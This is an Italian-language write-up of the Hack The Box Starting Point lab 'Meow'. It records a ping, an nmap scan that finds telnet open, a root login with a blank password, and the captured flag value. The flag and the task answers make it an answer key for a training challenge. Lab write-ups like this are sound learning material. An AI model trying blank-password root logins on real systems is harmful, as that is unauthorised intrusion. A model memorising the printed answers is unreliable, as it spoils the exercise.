HTB Starting Point – Meow

Difficoltà: Very Easy
Data: 13/11/2025

Connessione alla VPN

Il file .ovpn è stato scaricato nella directory sf_shared della VM Kali Linux. La connessione alla rete HTB è stata avviata tramite:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon


IP assegnato: 10.10.14.13
Target: 10.129.1.17

Task di Verifica
Task 1

Domanda: Significato dell'acronimo VM.
Risposta: Virtual Machine.
Stato: Corretta.

Task 2

Domanda: Strumento utilizzato per impartire comandi al sistema operativo tramite riga di comando.
Risposta: Terminal.
Stato: Corretta.

Task 3

Domanda: Servizio utilizzato per la connessione VPN nei laboratori HTB.
Risposta: OpenVPN.
Stato: Corretta.

Task 4

Domanda: Strumento utilizzato per inviare una richiesta ICMP di eco al target.
Risposta: Ping.
Stato: Corretta.

Evidenza:

ping -c 5 10.129.1.17
PING 10.129.1.17 (10.129.1.17) 56(84) bytes of data.
64 bytes from 10.129.1.17: icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from 10.129.1.17: icmp_seq=2 ttl=63 time=60.5 ms
64 bytes from 10.129.1.17: icmp_seq=3 ttl=63 time=60.4 ms
64 bytes from 10.129.1.17: icmp_seq=4 ttl=63 time=60.8 ms

--- 10.129.1.17 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4008ms
rtt min/avg/max/mdev = 60.434/60.684/60.993/0.235 ms

Task 5

Domanda: Strumento più comune per individuare porte aperte su un target.
Risposta: Nmap.
Stato: Corretta.

Evidenza:

nmap 10.129.1.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 02:34 CET
Nmap scan report for 10.129.1.17
Host is up (0.062s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds

Task 6

Domanda: Servizio individuato sulla porta 23/tcp.
Risposta: Telnet.
Stato: Corretta.

Task 7

Domanda: Nome utente che può accedere tramite Telnet con password vuota.
Risposta: root.
Stato: Corretta.

Task 8 – Root Flag

L’accesso è stato stabilito tramite Telnet sulla porta 23:

telnet 10.129.1.17
Meow login: root


Una volta ottenuta la shell, la flag è stata letta dalla home directory di root:

root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19


Flag: b40abdfe23665f766f9c61ecba8a4c19
Stato: Corretta.
